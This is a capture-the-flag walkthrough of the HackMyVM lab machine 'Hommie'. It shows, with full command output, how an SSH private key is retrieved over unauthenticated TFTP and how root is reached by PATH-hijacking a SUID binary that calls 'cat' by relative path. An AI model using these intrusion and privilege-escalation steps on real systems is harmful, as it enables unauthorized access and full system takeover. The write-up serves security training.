# Hommie

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Hommie | sml | Beginner | HackMyVM |

**Summary:** Hommie is a beginner-level Linux machine from HackMyVM that demonstrates several common security vulnerabilities. The initial reconnaissance reveals three open ports: FTP (21), SSH (22), and HTTP (80). The web service displays a message indicating that user "alexia" has exposed her SSH private key. Through UDP port scanning, TFTP service is discovered on port 69, which allows unauthenticated file retrieval. By leveraging TFTP, we can retrieve alexia's private SSH key and gain initial access to the system. For privilege escalation, a custom SUID binary `/opt/showMetheKey` is found that executes system commands with relative paths, making it vulnerable to PATH hijacking. This vulnerability is exploited to achieve root access.

---

## Reconnaissance

### Network Discovery

The initial phase begins with network discovery to identify the target machine:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.48 08:00:27:6E:82:29 VirtualBox
```

The scan identifies the target machine at `192.168.100.48` running on VirtualBox.

### Port Scanning

A comprehensive TCP port scan is performed to identify running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sV -sC -p- 192.168.100.48
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 11:13 WIB
Nmap scan report for 192.168.100.48
Host is up (0.0019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
```

The scan reveals three open TCP ports:
- **Port 21**: vsftpd 3.0.3 with anonymous login allowed
- **Port 22**: OpenSSH 7.9p1 Debian 10+deb10u2
- **Port 80**: nginx 1.14.2

### HTTP Service Enumeration

Examining the web service reveals an interesting message:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 192.168.100.48
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

The message suggests that user "alexia" has an exposed SSH private key, and mentions two users: "alexia" and "nobody".

### FTP Service Analysis

Investigating the FTP service with anonymous access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ ftp 192.168.100.48
Connected to 192.168.100.48.
220 (vsFTPd 3.0.3)
Name (192.168.100.48:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||64687|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
ftp> cd .web
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||21669|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||13807|)
150 Opening BINARY mode data connection for index.html (99 bytes).
100% |**********************|    99      903.54 KiB/s    00:00 ETA
226 Transfer complete.
99 bytes received in 00:00 (30.20 KiB/s)
ftp> bye
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ cat index.html
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

The FTP service contains the same message as the HTTP service. Despite exploring the directory structure, no additional files or attack vectors are found through FTP.

### UDP Port Scanning

Since the TCP scan didn't reveal the exposed SSH key, a UDP port scan is performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sU -F --top-ports 100 192.168.100.48
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 11:14 WIB
Nmap scan report for 192.168.100.48
Host is up (0.0013s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 111.11 seconds
```

The UDP scan reveals TFTP service on port 69, which is particularly interesting given the message about the exposed SSH key.

---

## Initial Access

### TFTP Service Exploitation

TFTP (Trivial File Transfer Protocol) typically runs without authentication and can be used to retrieve files. Given the hint about alexia's exposed SSH key, we attempt to retrieve it:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ tftp 192.168.100.48
tftp> get .ssh/id_rsa
Transfer timed out.

tftp> get id_rsa
tftp>
```

After trying the common SSH key path, attempting to retrieve `id_rsa` from the root directory succeeds without error.

### SSH Private Key Recovery

Confirming the successful file transfer:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ ls -la id_rsa
-rw------- 1 ouba ouba 1823 Jan 30 11:24 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
.........................[OUTPUT TRUNCATED]...........................
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

The SSH private key is successfully retrieved. To verify it belongs to alexia, we extract the public key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnBRHY+92Gy7VEYbRQhaaPbIM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjMdgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZWrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0BtIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5Td/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXaz alexia@hommie
```

The public key confirms this is alexia's SSH key from the hommie machine.

### SSH Access

Using the recovered private key to establish SSH connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hommie]
└─$ ssh -i id_rsa alexia@192.168.100.48
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
alexia@hommie:~$ id
uid=1000(alexia) gid=1000(alexia) groups=1000(alexia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

SSH access is successfully established as user alexia. The system information shows it's running Debian GNU/Linux with kernel 4.19.0-9-amd64.

### User Flag

Examining the home directory reveals the user flag:

```bash
alexia@hommie:~$ ls -la
total 36
drwxr-xr-x 4 alexia alexia 4096 Sep 30  2020 .
drwxr-xr-x 3 root   root   4096 Sep 30  2020 ..
-rw-r--r-- 1 alexia alexia  220 Sep 30  2020 .bash_logout
-rw-r--r-- 1 alexia alexia 3526 Sep 30  2020 .bashrc
drwxr-xr-x 3 alexia alexia 4096 Sep 30  2020 .local
-rw-r--r-- 1 alexia alexia  807 Sep 30  2020 .profile
drwx------ 2 alexia alexia 4096 Sep 30  2020 .ssh
-rw-r--r-- 1 alexia alexia   10 Sep 30  2020 user.txt
-rw------- 1 alexia alexia   52 Sep 30  2020 .Xauthority
```

The user.txt file contains the user flag.

---

## Privilege Escalation

### System Enumeration

Beginning privilege escalation by checking for available privilege escalation vectors. First, checking for sudo capabilities (which is not available):

```bash
alexia@hommie:~$ sudo -l
alexia@hommie:/tmp$ sudo
-bash: sudo: command not found
```

### SUID Binary Discovery

Searching for SUID binaries that might provide privilege escalation opportunities:

```bash
alexia@hommie:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-sr-x 1 root root 16720 Sep 30  2020 /opt/showMetheKey
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
```

A custom SUID binary is discovered: `/opt/showMetheKey` owned by root with SUID and SGID bits set.

### Binary Analysis

Examining the custom binary:

```bash
alexia@hommie:~$ file /opt/showMetheKey
/opt/showMetheKey: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=63398a6916b1b6bf3991e2b05fa60bec15b1faff, not stripped

alexia@hommie:~$ /opt/showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
.........................[OUTPUT TRUNCATED]...........................
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

The binary outputs the same SSH private key that was retrieved via TFTP. To verify it belongs to alexia:

```bash
alexia@hommie:~$ echo '0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==' | base64 -d
��ºKA
      alexia@hommie
```

The base64 decoded output confirms this is alexia's SSH key.

### Vulnerability Discovery

Using strings to analyze the binary's internal commands:

```bash
alexia@hommie:~$ strings /opt/showMetheKey
...
[]A\A]A^A_
cat $HOME/.ssh/id_rsa
;*3$"
...
```

The critical finding is the command: `cat $HOME/.ssh/id_rsa`

This reveals the vulnerability: the binary uses a relative path for the `cat` command instead of an absolute path. Since the binary runs with SUID privileges as root, this creates a PATH hijacking opportunity.

### PATH Hijacking Exploitation

Exploiting the vulnerability by creating a malicious `cat` executable and manipulating the PATH:

```bash
alexia@hommie:~$ cd /tmp
alexia@hommie:/tmp$ echo '/bin/bash -p' > cat
alexia@hommie:/tmp$ chmod +x cat
alexia@hommie:/tmp$ export PATH=/tmp:$PATH
alexia@hommie:/tmp$ /opt/showMetheKey
root@hommie:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
```

The PATH hijacking is successful! The system now executes our malicious `cat` command (which launches a privileged bash shell) instead of the legitimate cat binary, resulting in a root shell.

### Root Flag Recovery

Since the `cat` command has been hijacked, using `grep` to read files:

```bash
root@hommie:/tmp# grep . $(which cat)
/bin/bash -p
root@hommie:/tmp# cd
root@hommie:~# pwd
/home/alexia
root@hommie:~# cd /root
root@hommie:/root# ls -la
total 32
drwx------  4 root root 4096 Sep 30  2020 .
drwxr-xr-x 18 root root 4096 Sep 30  2020 ..
-rw-------  1 root root   52 Sep 30  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Sep 30  2020 .local
-rw-------  1 root root   44 Sep 30  2020 note.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Sep 30  2020 .ssh
```

Checking the note.txt file for clues about the root flag location:

```bash
root@hommie:/root# grep . note.txt
I dont remember where I stored root.txt !!!
```

Searching for the root flag across the filesystem:

```bash
root@hommie:/root# find / -type f -name "root.txt" 2>/dev/null
/usr/include/root.txt
root@hommie:/root# grep -h . /usr/include/root.txt /home/alexia/user.txt
Imn[REDACTED]
Imn[REDACTED]
```

Both the root and user flags are successfully retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.48 with FTP, SSH, and HTTP services running
2. **Service Enumeration**: HTTP service revealed message about alexia's exposed SSH key; UDP scan discovered TFTP service on port 69  
3. **Vulnerability Discovery**: TFTP service allowed unauthenticated file retrieval without proper access controls
4. **Initial Access**: Retrieved alexia's SSH private key via TFTP and established SSH session as user alexia
5. **Privilege Escalation**: Discovered custom SUID binary `/opt/showMetheKey` that executes system commands with relative paths, enabling PATH hijacking to gain root access

The machine demonstrates the importance of proper file permissions, secure service configurations, and the use of absolute paths in SUID binaries to prevent privilege escalation attacks.